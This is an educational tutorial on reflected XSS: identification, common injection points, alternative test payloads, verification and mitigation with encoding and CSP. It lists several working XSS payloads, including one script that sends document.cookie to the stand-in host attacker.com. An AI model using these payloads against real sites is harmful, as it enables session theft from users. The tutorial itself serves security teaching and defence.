**Reflected Cross-Site Scripting (Reflected XSS)** occurs when a web application **immediately reflects user input in the HTTP response** without proper sanitization or encoding.

Unlike Stored XSS, the payload is not stored on the server. Instead, it is included in a request (for example in a URL parameter, search field, or form input) and is directly returned by the server in the response page.

When a victim clicks a crafted link containing malicious input, the script is executed in the context of the vulnerable website.

---

## Identifying a Reflected XSS

A typical way to test for reflected XSS is by injecting a JavaScript payload into a parameter that is reflected in the response.

Example payload:

```html
<script>alert(window.origin)</script>
```

Example vulnerable URL:

```url
http://vulnerable-site.com/search?q=<script>alert(window.origin)</script>
```

If the page returns the value of the `q` parameter directly in the HTML response and the script executes, the application is vulnerable.

> Many web applications process user input through multiple layers (templates, filters, proxies, etc.). Observing the value of `window.origin` in the alert dialog confirms the execution context and helps identify the exact page where the payload is reflected.

---

## Common Injection Points

Reflected XSS is frequently found in parts of an application that display user input in the response.

Typical locations include:

- Search parameters
    
- URL query parameters
    
- Form inputs
    
- Error messages
    
- HTTP headers such as `User-Agent` or `Referer`
    
- Redirect parameters
    

Example reflected parameter:

```url
http://vulnerable-site.com/login?error=<script>alert(window.origin)</script>
```

If the application prints the error parameter directly in the page, the script will execute.

---

## Alternative XSS Testing Payloads

Some applications block standard `<script>` tags or JavaScript alerts. In such cases, alternative payloads may be used.

```html
<script>alert(1)</script>
```

```html
<img src=x onerror=alert(window.origin)>
```

```html
<svg onload=alert(window.origin)>
```

```html
<body onload=alert(window.origin)>
```

```html
<input autofocus onfocus=alert(window.origin)>
```

```html
<iframe src="javascript:alert(window.origin)">
```

```html
<details open ontoggle=alert(window.origin)>
```

```html
<script>confirm(window.origin)</script>
```

```html
<script>prompt(window.origin)</script>
```

```html
<script>
fetch("http://attacker.com/?cookie="+document.cookie)
</script>
```

---

## Confirming the Vulnerability is Reflected

To verify that the vulnerability is **reflected and not stored**, the payload must only execute when it is included in the request.

Typical verification process:

- Inject the payload into a parameter
    
- Send the request
    
- Observe the response
    

If the script executes only when the payload is present in the request and **does not persist after refreshing the page without the payload**, the vulnerability is reflected XSS.

---

## Mitigation

Preventing reflected XSS requires safe handling of user input before it is rendered in responses.

Key defensive practices include:

- Encode user input before inserting it into HTML output
    
- Use context-aware output encoding (HTML, JavaScript, URL, attribute contexts)
    
- Validate and restrict input values
    
- Avoid directly inserting user input into HTML or JavaScript code
    
- Implement Content Security Policy (CSP)
    

Example CSP header:

```http
Content-Security-Policy: default-src 'self'
```

Content Security Policy helps reduce the impact of reflected XSS by restricting which scripts are allowed to execute in the browser.